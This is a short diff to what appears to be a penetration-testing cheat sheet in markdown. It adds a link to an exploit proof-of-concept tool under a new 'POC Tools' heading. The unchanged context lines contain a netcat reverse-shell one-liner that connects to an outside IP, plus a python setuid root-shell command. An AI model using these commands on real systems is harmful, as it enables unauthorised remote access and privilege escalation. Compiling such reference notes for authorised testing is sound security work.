@@ -99,6 +99,10 @@ rm /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe|/bin/sh -i 2>&1|nc 10.0.0.189 1234
 python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
+### POC Tools
+
+https://github.com/mbechler/marshalsec
+
 ### Services & Apps
 
 https://www.crowdstrike.com/
